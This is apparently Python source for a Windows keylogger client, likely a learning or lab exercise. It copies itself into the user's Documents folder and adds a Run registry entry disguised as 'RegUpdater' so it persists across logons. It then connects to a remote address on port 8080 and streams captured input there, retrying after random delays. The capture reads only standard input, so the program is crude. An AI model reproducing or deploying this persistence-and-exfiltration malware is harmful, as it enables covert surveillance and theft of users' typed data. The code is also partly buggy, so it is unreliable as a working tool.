import socket
import os
import subprocess
import time
import shutil
import random
import winreg as wreg

def persistance():
	path = os.getcwd().strip('/n')
	Null, userprof = subprocess.check_output('set USERPROFILE', shell=True,stdin=subprocess.PIPE,  stderr=subprocess.PIPE).decode().split('=')
	
	destination = userprof.strip('\n\r') + '\\Documents\\' + 'keyLoggerClient.exe'
	
#First time
	if not os.path.exists(destination):
		shutil.copyfile(path+'\keyLoggerClient.exe', destination)
		key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
		wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
		key.Close()
	
def connecting():
	s = socket.socket()
	print("Trying to connect")
	s.connect(("192.168.88.128", 8080))
	print("Connected")
	
	while True:
		try:
			print("Starting Keylog...")
			text = input().encode()
			while True:
				s.send(text)
				text = input().encode()
		except KeyboardInterrupt:
			print("[!] Programa was terminated")
			s.close()
			break

def main():
	persistance()
	while True:
		try:
			connecting()
		except:
			sleep_for = random.randrange(1,10) #Sleep
			time.sleep(int(sleep_for))
main()
